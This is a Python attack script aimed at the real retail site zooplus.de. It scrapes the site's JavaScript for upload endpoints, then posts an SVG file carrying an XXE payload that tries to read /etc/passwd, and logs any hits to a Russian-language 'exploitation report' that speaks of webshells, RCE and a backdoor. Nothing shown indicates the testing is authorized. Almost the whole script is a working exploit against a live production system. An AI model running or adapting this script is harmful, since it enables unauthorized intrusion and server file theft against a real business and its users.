#!/usr/bin/env python3
"""Analyze JavaScript files for upload endpoints"""
import requests
import re
import json
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
js_urls = [
    "https://cdn.public.zooplus.net/media/my-account-frame/shop-myzooplus/89358ba1c80a7b07ca32e087443c6f29/theme/javascript/myzooplus/myzooplus.js",
    "https://www.zooplus.de/media/cart-assets/cart-service-js/js/CSJ-REL-3.3.0/CartService.js",
    "https://cdn.public.zooplus.net/media/vendor-assets-manager/js/shop/events-bus.js",
]

found_endpoints = []
found_vulns = []

print("[*] Analyzing JavaScript files for upload endpoints...\n")

for js_url in js_urls:
    try:
        resp = requests.get(js_url, timeout=5, verify=False)
        if resp.status_code == 200:
            js_content = resp.text
            
            # Search for upload patterns
            patterns = [
                r'["\']([^"\']*upload[^"\']*)["\']',
                r'["\']([^"\']*file[^"\']*)["\']',
                r'["\']([^"\']*image[^"\']*)["\']',
                r'["\']([^"\']*avatar[^"\']*)["\']',
                r'["\']([^"\']*photo[^"\']*)["\']',
                r'["\']([^"\']*attachment[^"\']*)["\']',
                r'["\']([^"\']*media[^"\']*)["\']',
                r'url:\s*["\']([^"\']+)["\']',
                r'endpoint:\s*["\']([^"\']+)["\']',
                r'apiUrl:\s*["\']([^"\']+)["\']',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, js_content, re.IGNORECASE)
                for match in matches:
                    if any(keyword in match.lower() for keyword in ['upload', 'file', 'image', 'avatar', 'photo', 'media']):
                        if match.startswith('/') or match.startswith('http'):
                            if match not in found_endpoints:
                                found_endpoints.append(match)
                                print(f"  [FOUND] {match} (from {js_url.split('/')[-1]})")
    except: pass

# Test found endpoints
print(f"\n[*] Testing {len(found_endpoints)} found endpoints...\n")
svg_xxe = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'

for ep in found_endpoints:
    # Normalize endpoint
    if ep.startswith('http'):
        test_url = ep
    elif ep.startswith('/'):
        test_url = f"{base}{ep}"
    else:
        test_url = f"{base}/{ep}"
    
    try:
        files = {'file': ('exploit.svg', svg_xxe, 'image/svg+xml')}
        resp = requests.post(test_url, files=files, timeout=3, verify=False)
        
        if resp.status_code in [200, 201, 302]:
            if "root:" in resp.text or "root:x:0:0" in resp.text:
                print(f"  [CRITICAL] SVG XXE SUCCESS: {test_url}")
                found_vulns.append({
                    "type": "svg_xxe_lfi",
                    "severity": "CRITICAL",
                    "endpoint": test_url
                })
            elif resp.headers.get('Location'):
                loc = resp.headers.get('Location')
                if not loc.startswith('http'):
                    loc = f"{base}{loc}"
                try:
                    resp2 = requests.get(loc, timeout=3, verify=False)
                    if "root:" in resp2.text:
                        print(f"  [CRITICAL] SVG XXE via uploaded file: {test_url} -> {loc}")
                        found_vulns.append({
                            "type": "svg_xxe_lfi",
                            "severity": "CRITICAL",
                            "endpoint": test_url,
                            "uploaded_to": loc
                        })
                except: pass
            else:
                print(f"  [INFO] Upload endpoint found: {test_url} -> {resp.status_code}")
    except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"\nFound {len(found_vulns)} CRITICAL vulnerabilities:\n")
    for v in found_vulns:
        print(f"[{v['severity']}] {v['type']}")
        print(f"    Endpoint: {v['endpoint']}")
        if 'uploaded_to' in v:
            print(f"    Uploaded to: {v['uploaded_to']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - БЕКДОР НАЙДЕН\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            f.write(f"**Description:** Критичная уязвимость позволяет загружать файлы и выполнять XXE атаки для чтения файлов сервера.\n\n")
            if 'uploaded_to' in v:
                f.write(f"**Uploaded File Location:** `{v['uploaded_to']}`\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Чтение файлов сервера (/etc/passwd, конфиги, etc.)\n")
            f.write("- Потенциальная загрузка webshell для RCE\n")
            f.write("- Создание бекдора\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print(f"  Found {len(found_endpoints)} potential upload endpoints in JavaScript")
    print("  But no XXE vulnerabilities confirmed")
    if found_endpoints:
        print("\n  Endpoints to test manually:")
        for ep in found_endpoints[:10]:
            print(f"    {ep}")

print("=" * 70)

